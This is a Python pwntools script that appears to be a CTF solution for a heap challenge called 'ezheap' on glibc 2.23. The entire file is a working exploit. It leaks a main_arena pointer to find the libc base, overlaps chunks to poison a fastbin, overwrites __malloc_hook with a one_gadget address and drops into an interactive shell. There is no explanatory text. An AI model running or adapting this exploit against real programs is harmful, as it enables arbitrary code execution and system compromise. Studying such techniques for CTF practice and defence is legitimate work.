#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./ezheap')
libc = ELF('./libc-2.23.so')
elf = ELF('./ezheap')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(size):
	p.sendlineafter("4.show\n",b"1")
	p.sendlineafter("how big\n",str(size))

def edit(idx,size,content):
	p.sendlineafter("4.show\n",b"3")
	p.sendlineafter("idx\n",str(idx))
	p.sendlineafter("how big u read\n",str(size))
	p.sendlineafter("Content:\n",content)

def delete(idx):
	p.sendlineafter("4.show\n",b"2")
	p.sendlineafter("idx\n",str(idx))

def show(idx):
	p.sendlineafter("4.show\n",b"4")
	p.sendlineafter("idx\n",str(idx))


add(0x100)#num 0
add(0x100)#1
add(0x100)#2

delete(1)#1
add(0x60)#2
show(2)

p.recvuntil("Content:")
main_are = u64(p.recv(6).ljust(8,b'\x00'))
libcbase = main_are - 0x3C3C78
__malloc_hook = libcbase + libc.sym['__malloc_hook']

pr('main_are',main_are)
pr('libcbase',libcbase)
pr('__malloc_hook',__malloc_hook)


add(0x90)#3
add(0x10)#4
delete(0)#3
edit(2, 0x70, 'A'*0x60 + p64(0x180) + p64(0xa0))
delete(3)#2

add(0x100)#3
add(0x60)#4
delete(4)#3

edit(2, 0x8, p64(__malloc_hook-0x23))

add(0x90)#4
add(0x60)#5
edit(5, 0x10, 'a')
add(0x60)#6

og = 0xf0897 + libcbase
edit(6, 0x60, 0x13 * b'\x00' + p64(og))
#gdb.attach(p)
#pause()
add(0x10)

p.interactive()